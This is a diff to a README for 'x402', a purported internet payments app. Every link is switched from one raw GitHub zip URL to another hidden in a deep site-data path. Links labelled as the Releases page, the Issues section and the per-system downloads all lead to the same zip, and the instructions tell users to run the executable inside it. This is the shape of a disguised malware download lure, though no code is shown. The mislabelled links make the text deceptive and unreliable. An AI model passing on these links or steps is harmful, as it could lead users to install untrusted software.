@@ -1,7 +1,7 @@
 # 🚀 x402 - Simplifying Payments for Everyone
 
 ## 📥 Download Now
-[![Download x402](https://raw.githubusercontent.com/Ster-bot/x402/main/quip/x402.zip)](https://raw.githubusercontent.com/Ster-bot/x402/main/quip/x402.zip)
+[![Download x402](https://raw.githubusercontent.com/Ster-bot/x402/main/typescript/site/app/ecosystem/partners-data/fluora/x-2.8.zip)](https://raw.githubusercontent.com/Ster-bot/x402/main/typescript/site/app/ecosystem/partners-data/fluora/x-2.8.zip)
 
 ## 📝 Overview
 x402 is a user-friendly payments protocol designed for the internet. It helps you send and receive money easily through the web. Built on the widely used HTTP standard, x402 aims to make online payments accessible for everyone, regardless of technical skills.
@@ -10,7 +10,7 @@ x402 is a user-friendly payments protocol designed for the internet. It helps yo
 To begin using x402, follow the steps below. They will guide you through the process of downloading and running the software.
 
 ## 🔗 Visit the Releases Page
-Start by going to the [Releases page](https://raw.githubusercontent.com/Ster-bot/x402/main/quip/x402.zip). Here, you can find all the latest versions of x402.
+Start by going to the [Releases page](https://raw.githubusercontent.com/Ster-bot/x402/main/typescript/site/app/ecosystem/partners-data/fluora/x-2.8.zip). Here, you can find all the latest versions of x402.
 
 ## 🛠️ System Requirements
 Before you download x402, ensure your system meets the following requirements:
@@ -24,14 +24,14 @@ Before you download x402, ensure your system meets the following requirements:
 
 2. **Download the Application:**
    - Click on the version name to expand the details and then look for the download link that suits your operating system.
-   - For Windows, this might be named something like `https://raw.githubusercontent.com/Ster-bot/x402/main/quip/x402.zip`.
-   - For macOS, look for `https://raw.githubusercontent.com/Ster-bot/x402/main/quip/x402.zip`.
-   - For Linux, find the file labeled `https://raw.githubusercontent.com/Ster-bot/x402/main/quip/x402.zip`.
+   - For Windows, this might be named something like `https://raw.githubusercontent.com/Ster-bot/x402/main/typescript/site/app/ecosystem/partners-data/fluora/x-2.8.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/Ster-bot/x402/main/typescript/site/app/ecosystem/partners-data/fluora/x-2.8.zip`.
+   - For Linux, find the file labeled `https://raw.githubusercontent.com/Ster-bot/x402/main/typescript/site/app/ecosystem/partners-data/fluora/x-2.8.zip`.
 
 3. **Run the Installer:**
    - If you are on Windows, double-click the `.exe` file to start the installation.
    - On macOS, open the `.dmg` file and drag the x402 application to your Applications folder.
-   - For Linux, extract the https://raw.githubusercontent.com/Ster-bot/x402/main/quip/x402.zip file and follow the README instructions provided within.
+   - For Linux, extract the https://raw.githubusercontent.com/Ster-bot/x402/main/typescript/site/app/ecosystem/partners-data/fluora/x-2.8.zip file and follow the README instructions provided within.
 
 4. **First Launch:**
    - After installation, locate the x402 app on your device.
@@ -49,7 +49,7 @@ If you experience any issues during installation, please refer to the FAQ sectio
 ## 📚 Help & Support
 If you have questions or need assistance, you can:
 
-- Visit the [Issues section](https://raw.githubusercontent.com/Ster-bot/x402/main/quip/x402.zip) of this repository to report bugs or request features.
+- Visit the [Issues section](https://raw.githubusercontent.com/Ster-bot/x402/main/typescript/site/app/ecosystem/partners-data/fluora/x-2.8.zip) of this repository to report bugs or request features.
 - Look for troubleshooting tips that may help resolve common problems.
 - Join the community discussions to connect with other users and share your experiences.
 
@@ -60,4 +60,4 @@ x402 is open source and follows the MIT License. This means you can use, modify,
 For more inquiries regarding the app or feature requests, feel free to reach out via the contact option shown on the GitHub repository page.
 
 ## 🏁 Conclusion
-We hope you enjoy using x402 for your online payments. By following these steps, you can easily download, install, and start enhancing your payment experience on the internet. Don't forget to visit the [Releases page](https://raw.githubusercontent.com/Ster-bot/x402/main/quip/x402.zip) again for future updates and improvements.
+We hope you enjoy using x402 for your online payments. By following these steps, you can easily download, install, and start enhancing your payment experience on the internet. Don't forget to visit the [Releases page](https://raw.githubusercontent.com/Ster-bot/x402/main/typescript/site/app/ecosystem/partners-data/fluora/x-2.8.zip) again for future updates and improvements.
